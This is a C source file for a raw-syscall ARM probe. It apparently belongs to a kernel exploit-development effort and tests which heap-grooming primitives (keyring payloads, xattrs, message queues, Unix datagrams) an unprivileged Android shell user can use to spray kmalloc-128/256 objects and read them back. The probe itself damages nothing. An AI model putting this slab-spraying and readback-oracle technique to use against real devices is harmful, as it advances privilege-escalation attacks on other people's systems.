/*
 * groom_probe.c -- Phase 14 Round 22, Task 0.
 *
 * Bare-metal armv7a static ELF (no libc, raw svc 0). Probes which heap-grooming
 * primitives are reachable from uid 2000 on kernel 5.4.286-ab0600 (arm64 kernel,
 * armv8l userspace) and, crucially, which ones ALLOW READBACK (a canary oracle).
 *
 * ARM 32-bit syscall numbers (v5.4 arch/arm/tools/syscall.tbl, confirmed locally):
 *   getpid=20 unlink=10 read=3 write=4 close=6 poll=168
 *   setxattr=226 getxattr=229 mq_open=274 mq_unlink=275
 *   socket=281 socketpair=288 sendmsg=296 recvmsg=297
 *   add_key=309 keyctl=311 openat=322
 *
 * Build:
 *   clang --target=armv7a-linux-androideabi21 -nostdlib -static -Os \
 *         -o groom_probe groom_probe.c
 * Usage: groom_probe <xattr-file-path>
 */
#define __NR_exit      1
#define __NR_read      3
#define __NR_write     4
#define __NR_close     6
#define __NR_unlink   10
#define __NR_getpid   20
#define __NR_setxattr 226
#define __NR_getxattr 229
#define __NR_mq_open  274
#define __NR_mq_unlink 275
#define __NR_socket   281
#define __NR_socketpair 288
#define __NR_sendmsg  296
#define __NR_recvmsg  297
#define __NR_add_key  309
#define __NR_keyctl   311
#define __NR_openat   322

#define AT_FDCWD (-100)
#define O_RDWR   2
#define O_CREAT  0100
#define O_TRUNC  01000
#define O_WRONLY 1
#define IPC_CREAT 01000

#define AF_UNIX  1
#define SOCK_DGRAM 2

#define KEY_SPEC_SESSION_KEYRING (-3)
#define KEYCTL_GET_KEYRING_ID 0
#define KEYCTL_DESCRIBE 6
#define KEYCTL_READ 11

typedef unsigned char u8;
typedef unsigned short u16;
typedef unsigned int u32;

/* ---- minimal EABI helpers ---- */
void __aeabi_memcpy(void*d,const void*s,unsigned n)
{volatile u8*x=d;volatile const u8*y=s;while(n--)*x++=*y++;}
void __aeabi_memmove(void*d,const void*s,unsigned n){__aeabi_memcpy(d,s,n);}
void __aeabi_memset(void*d,int c,unsigned n){volatile u8*x=d;while(n--)*x++=(u8)c;}
void __aeabi_memclr(void*d,unsigned n){__aeabi_memset(d,0,n);}

static void zero_(void*p,unsigned n){volatile u8*q=p;while(n--)*q++=0;}
static int slen_(const char*s){volatile const char*p=s;int n=0;while(*p){p++;n++;}return n;}

/* raw syscall wrappers -- must be defined before output helpers */
static long sys1(long n,long a)
{register long r0 asm("r0")=a,r7 asm("r7")=n;asm volatile("svc 0":"+r"(r0):"r"(r7):"memory");return r0;}
static long sys3(long n,long a,long b,long c)
{register long r0 asm("r0")=a,r1 asm("r1")=b,r2 asm("r2")=c,r7 asm("r7")=n;asm volatile("svc 0":"+r"(r0):"r"(r1),"r"(r2),"r"(r7):"memory");return r0;}
static long sys4(long n,long a,long b,long c,long d)
{register long r0 asm("r0")=a,r1 asm("r1")=b,r2 asm("r2")=c,r3 asm("r3")=d,r7 asm("r7")=n;asm volatile("svc 0":"+r"(r0):"r"(r1),"r"(r2),"r"(r3),"r"(r7):"memory");return r0;}
static long sys5(long n,long a,long b,long c,long d,long e)
{register long r0 asm("r0")=a,r1 asm("r1")=b,r2 asm("r2")=c,r3 asm("r3")=d,r4 asm("r4")=e,r7 asm("r7")=n;asm volatile("svc 0":"+r"(r0):"r"(r1),"r"(r2),"r"(r3),"r"(r4),"r"(r7):"memory");return r0;}

static void puts_(const char*s){sys3(__NR_write,1,(long)s,slen_(s));}
static void putint(long v)
{
    char b[24];int i=0,neg=0;
    if(v<0){neg=1;v=-v;}
    if(!v)b[i++]='0';
    while(v>0){b[i++]='0'+(v%10);v/=10;}
    if(neg)sys3(__NR_write,1,(long)"-",1);
    for(int j=i-1;j>=0;j--){char c=b[j];sys3(__NR_write,1,(long)&c,1);}
}
static void puthex(u32 v)
{
    char b[8];const char*h="0123456789abcdef";
    for(int i=7;i>=0;i--){b[i]=h[v&0xf];v>>=4;}
    sys3(__NR_write,1,(long)b,8);
}
static int eq_(const char*a,const char*b)
{volatile const char*x=a,*y=b;while(*x&&*y){if(*x!=*y)return 0;x++;y++;}return *x==*y;}

static long add_key(const char*type,const char*desc,const void*payload,u32 plen,long ring)
{return sys5(__NR_add_key,(long)type,(long)desc,(long)payload,plen,ring);}
static long keyctl(long cmd,long a,long b,long c,long d)
{return sys5(__NR_keyctl,cmd,a,b,c,d);}

struct iovec { void*iov_base; u32 iov_len; };
struct msghdr {
    void*msg_name; u32 msg_namelen; struct iovec*msg_iov; u32 msg_iovlen;
    void*msg_control; u32 msg_controllen; int msg_flags;
};

static u8 fillbuf[512];
static u8 readbuf[512];

/* fill a pattern: first byte index encoded so corruption of offset 0..3 is visible */
static void pattern(u8*p,int n,int tag)
{
    for(int i=0;i<n;i++) p[i]=(u8)(0x41 + ((i+tag)%26));
}
static int check_pattern(u8*p,int n,int tag)
{
    int bad=0;
    for(int i=0;i<n;i++) if(p[i]!=(u8)(0x41+((i+tag)%26))) bad++;
    return bad;
}

__attribute__((naked)) void _start(void){__asm__ volatile("mov r0,sp\n\tb probe_main\n");}
void probe_main(unsigned long*stackp)
{
    int argc=(int)stackp[0]; char**argv=(char**)&stackp[1];
    puts_("=== Phase14 Round22 Task0: grooming primitives ===\n");
    puts_("pid=");putint(sys1(__NR_getpid,0));puts_("\n");
    const char*xpath = (argc>=2)?argv[1]:"/data/local/tmp/r22_xattr";

    /* ---------- 1. keyrings ---------- */
    puts_("[KEYS] session keyring id = ");
    long kr = keyctl(KEYCTL_GET_KEYRING_ID,KEY_SPEC_SESSION_KEYRING,0,0,0);
    putint(kr);puts_("\n");
    if(kr>=0){
        int sizes[2]={128,256};
        for(int s=0;s<2;s++){
            int plen=sizes[s];
            pattern(fillbuf,plen,s+1);
            /* description length 120 -> kstrdup(desc)=121 bytes -> kmalloc-128 */
            char desc[160]; zero_(desc,sizeof(desc));
            for(int i=0;i<120;i++) desc[i]=(char)('a'+(i%26));
            puts_("  add_key(user, desc=120, payload=");putint(plen);puts_(") = ");
            long kid=add_key("user",desc,fillbuf,plen,kr);
            putint(kid);puts_("\n");
            if(kid>=0){
                zero_(readbuf,sizeof(readbuf));
                long rr=keyctl(KEYCTL_READ,kid,(long)readbuf,plen,0);
                puts_("    KEYCTL_READ = ");putint(rr);
                if(rr>0){puts_(" mismatched=");putint(check_pattern(readbuf,plen,s+1));}
                puts_("\n");
                zero_(readbuf,sizeof(readbuf));
                long dr=keyctl(KEYCTL_DESCRIBE,kid,(long)readbuf,sizeof(readbuf)-1,0);
                puts_("    KEYCTL_DESCRIBE = ");putint(dr);puts_(" tail=");
                if(dr>0){ int st=slen_((char*)readbuf); puts_((char*)readbuf+((st>40)?(st-40):0)); }
                puts_("\n");
            }
        }
    } else {
        puts_("  -> keyctl(GET_KEYRING_ID) failed; keyrings unavailable\n");
    }

    /* ---------- 2. setxattr / getxattr ---------- */
    puts_("[XATTR] path=");puts_(xpath);puts_("\n");
    {
        long fd=sys4(__NR_openat,AT_FDCWD,(long)xpath,O_WRONLY|O_CREAT|O_TRUNC,0644);
        puts_("  open = ");putint(fd);puts_("\n");
        if(fd>=0) sys1(__NR_close,fd);
        if(fd>=0){
            int sizes[2]={128,256};
            for(int s=0;s<2;s++){
                int sz=sizes[s];
                pattern(fillbuf,sz,s+1);
                long xr=sys5(__NR_setxattr,(long)xpath,(long)"user.r22",(long)fillbuf,sz,0);
                puts_("  setxattr(size=");putint(sz);puts_(") = ");putint(xr);puts_("\n");
                if(xr==0){
                    zero_(readbuf,sizeof(readbuf));
                    long gr=sys4(__NR_getxattr,(long)xpath,(long)"user.r22",(long)readbuf,sz);
                    puts_("    getxattr = ");putint(gr);
                    if(gr>0){puts_(" mismatched=");putint(check_pattern(readbuf,sz,s+1));}
                    puts_("\n");
                }
            }
        }
    }

    /* ---------- 3. POSIX mqueue ---------- */
    puts_("[MQ] mq_open(O_CREAT|O_RDWR) = ");
    long mq=sys4(__NR_mq_open,(long)"/r22probe",O_RDWR|IPC_CREAT,0600,0);
    putint(mq);puts_("\n");
    if(mq>=0){puts_("  -> UNEXPECTED success; mq_unlink=");putint(sys3(__NR_mq_unlink,(long)"/r22probe",0,0));puts_("\n");}
    else puts_("  -> POSIX mqueue unavailable to shell\n");

    /* ---------- 4. AF_UNIX SOCK_DGRAM ---------- */
    puts_("[UNIX] socketpair(AF_UNIX,SOCK_DGRAM) = ");
    int fds[2];
    long sp=sys4(__NR_socketpair,AF_UNIX,SOCK_DGRAM,0,(long)fds);
    putint(sp);puts_(" fds=(");putint(fds[0]);puts_(",");putint(fds[1]);puts_(")\n");
    if(sp==0){
        int msgsz=128;
        pattern(fillbuf,msgsz,7);
        struct iovec iov; iov.iov_base=fillbuf; iov.iov_len=msgsz;
        struct msghdr mh; zero_(&mh,sizeof(mh)); mh.msg_iov=&iov; mh.msg_iovlen=1;
        puts_("  sendmsg(size=128) = ");putint(sys3(__NR_sendmsg,fds[0],(long)&mh,0));puts_("\n");
        zero_(readbuf,sizeof(readbuf));
        struct iovec riov; riov.iov_base=readbuf; riov.iov_len=msgsz;
        struct msghdr rmh; zero_(&rmh,sizeof(rmh)); rmh.msg_iov=&riov; rmh.msg_iovlen=1;
        puts_("  recvmsg = ");putint(sys3(__NR_recvmsg,fds[1],(long)&rmh,0));
        puts_(" mismatched=");putint(check_pattern(readbuf,msgsz,7));puts_("\n");
        sys1(__NR_close,fds[0]); sys1(__NR_close,fds[1]);
    }

    puts_("=== done ===\n");
    sys3(__NR_exit,0,0,0);
    for(;;){}
}
